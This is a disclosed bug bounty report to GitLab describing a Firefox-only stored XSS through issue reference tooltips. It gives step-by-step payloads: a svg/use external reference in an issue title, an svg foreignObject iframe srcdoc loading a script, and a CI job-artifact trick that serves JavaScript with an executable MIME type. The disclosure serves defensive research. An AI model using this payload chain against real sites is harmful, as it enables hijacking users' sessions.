# XSS on Issue reference numbers

## Report Details
- **Report ID**: 831962
- **URL**: https://hackerone.com/reports/831962
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-03-26T11:32:16.498Z
- **Disclosed**: 2020-11-23T16:05:04.527Z

## Reporter
- **Username**: yvvdwf
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
Dear team,

I found an XSS that occurs when users move mouse over reference numbers of issues. 
This XSS occurs on Firefox. It does not occurs on Webkit-based ones such as Safari, Chrome. I haven't tested on Edge.
It can be also occured in older browsers due to [`svg4everybody()`](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/commons/polyfills/svg.js#L11) and [`cachedDocument.body.innerHTML = xhr.responseText`](https://github.com/jonathantneal/svg4everybody/blob/v2.1.9/dist/svg4everybody.js#L36)

### Summary

XSS caused by enabling HTML of tooltip of issues' reference numbers.
Bootstrap sanitizes macilious tags/attributes of HTML tooltips.
The issue is that gitlab [allows](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/commons/bootstrap.js#L77) `<svg>`, `<use>` and its `xlink:href` attribute.
This allows attacker to link external resource to svg images, then, to cause the XSS.


### Steps to reproduce

Four big steps to reproduce:

1. create a javascript file
2. create a file containing external svg resource
3. create an issue's title having svg content that use the resource above
4. create a reference to the issue, XSS occurs when users move mouse over the reference link

Steps 1,2,3 are supposed to realized in a same project.

#### 1. Create a javascript file

This step creates a javascript file that may contain arbitrary attack script.
For example, add a new file `alert.js` in a selected project with the following content:

```javascript
alert('Hello: ' + window.parent.location.href);
```

This script will be used by an `iframe`.

Since gitlab changes its mime type to ['text/plain'](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/controllers/concerns/send_file_upload.rb#L16) and set header `X-Content-Type-Options: nosniff`, browser will refuse to execute the javascript file if it will be loaded by script tag, such as `<script src=alert.js></script`.

This can be bypassed by using `job artifacts`.

Create another file `.gitlab-ci.yml` with the following content:

```yml
js:
  script: echo "to generate mime type application/javascript"
  artifacts:
    paths:
    - alert.js
    expire_in: 4 week
```

After saving the file, gitlab CI/CD will start runing. Wait for the job finished.
Browse `Job artifacts`, then get the raw link of the generated `alert.js` file, for example:
`https://gitlab.com/yvvdwf/svg-use-xss-firefox/-/jobs/486384886/artifacts/raw/alert.js`

Note that the mime type of this js file is now `application/javascript`.

#### 2. Create a svg file

Add the third file in to the project with the name `xss.svg` and the following content:

```xml
<svg id="xss" xmlns="http://www.w3.org/2000/svg">
	<foreignObject>
		<iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc='&lt;script src=https://gitlab.com/yvvdwf/svg-use-xss-firefox/-/jobs/486384886/artifacts/raw/alert.js&gt; &lt;/script&gt;'></iframe>
	</foreignObject>
</svg>
```

Please note that, you must replace the link to `alert.js` file with your.


#### 3. Create an issue

Create a new issue having the following title:
 
`<svg><use xlink:href="https://gitlab.com/yvvdwf/svg-use-xss-firefox/-/raw/master/xss.svg#xss"/></svg>`

#### 4. Create a reference to the issue

In an issue discussion, or in a wiki page, enter the reference number of the issue, for example (suppose the issue id = 1):
`Move mouse over #1 to see alert`

When you move mouse over the number 1, you will see a (normal) tooltip and a popup executed by the `alert.js` file above.

This has been tested on the latest Firefox (74.0 (64-bit)) on macOS. Firefox allows `foreignObject` (but not [webkit](https://bugs.webkit.org/show_bug.cgi?id=91515))

### Impact

Attacker may perform arbitrary actions on behalf of users at the client side.

### Examples

An example is on https://gitlab.com/yvvdwf/svg-use-xss-firefox
This project is private. Please let me know if you cannot access it.


### What is the expected *correct* behavior?

Malicious scripts must not be executed due to svg content.

### Output of checks

This bug happens on GitLab.com

## Impact

Attacker may perform arbitrary actions on behalf of users at the client side.

## Attachments
No attachments
